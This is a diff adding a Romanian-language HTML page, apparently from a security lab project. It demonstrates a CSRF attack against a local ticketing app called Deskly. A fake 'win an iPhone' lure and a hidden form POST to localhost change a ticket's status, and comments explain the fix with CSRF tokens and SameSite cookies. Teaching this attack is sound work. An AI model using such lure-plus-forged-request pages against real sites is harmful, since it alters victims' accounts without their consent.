@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <title>Pagina Externă Malițioasă</title>
+</head>
+<body>
+    <h1>🎁 Câștigă un iPhone!</h1>
+    <p>Felicitări! Ai câștigat un premiu. Click pe buton pentru a-l revendica.</p>
+
+    <!--
+        DEMONSTRATIE ATAC CSRF (varianta vulnerabila):
+        Cand un utilizator logat in Deskly acceseaza aceasta pagina,
+        formularul ascuns se trimite automat catre serverul Deskly.
+        Serverul vulnerabil nu verifica originea request-ului
+        si executa schimbarea de status.
+
+        In versiunea FIXED acest request este respins deoarece:
+        1. Lipseste token-ul CSRF valid
+        2. Cookie-ul are SameSite=Lax (nu se trimite cross-origin pentru POST)
+    -->
+    <form id="csrf-form"
+          action="http://localhost:5001/tickets/0f58e327-1eaa-4eef-8c61-df7d26ae8b97/status"
+          method="POST"
+          style="display:none;">
+        <input type="hidden" name="status" value="RESOLVED">
+    </form>
+
+    <button onclick="document.getElementById('csrf-form').submit()">
+        Revendica Premiul!
+    </button>
+
+    <p style="font-size:11px; color:#999;">
+        (In versiunea vulnerabila: click-ul modifica status tichetului #1 in Deskly fara stirea utilizatorului)<br>
+        (In versiunea securizata: request-ul este respins cu 400 Bad Request - CSRF token invalid)
+    </p>
+</body>
+</html>
